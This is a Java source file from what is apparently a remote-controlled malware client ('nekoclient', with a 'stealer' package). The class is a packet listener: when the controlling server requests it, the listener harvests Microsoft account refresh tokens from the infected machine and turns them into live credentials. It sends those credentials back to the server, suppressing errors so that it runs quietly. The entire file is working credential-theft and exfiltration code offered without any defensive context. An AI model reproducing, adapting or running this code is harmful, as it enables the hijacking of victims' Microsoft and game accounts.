package dev.neko.nekoclient.packet.listener.impl;

import dev.neko.nekoclient.Client;
import dev.neko.nekoclient.api.stealer.msa.auth.MicrosoftAuth;
import dev.neko.nekoclient.api.stealer.msa.auth.credentials.MicrosoftCredentials;
import dev.neko.nekoclient.api.stealer.msa.impl.MSAStealer;
import dev.neko.nekoclient.packet.impl.client.MSAResponsePacket;
import dev.neko.nekoclient.packet.impl.server.RequestMSAPacket;
import dev.neko.nekoclient.packet.listener.PacketListener;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class RequestMSAPacketListener implements PacketListener<RequestMSAPacket> {
   public void call(RequestMSAPacket packet, Client client, String id) throws IOException {
      ExecutorService executorService = Executors.newSingleThreadExecutor();
      executorService.execute(() -> {
         List<MicrosoftCredentials> credentials = new ArrayList<>();

         for(MSAStealer.RefreshToken refreshToken : MSAStealer.retrieveRefreshTokens()) {
            try {
               MicrosoftCredentials credential = MicrosoftAuth.refreshToken(refreshToken.getToken(), refreshToken.getClientType());
               if (credentials.stream().noneMatch(credential2 -> Objects.equals(credential2.getUserId(), credential.getUserId()))) {
                  credentials.add(credential);
               }

               Thread.sleep(5000L);
            } catch (Throwable var8) {
            }
         }

         try {
            client.send(new MSAResponsePacket(packet.getNonce(), credentials));
         } catch (IOException var7) {
         }

         executorService.shutdown();
      });
   }
}
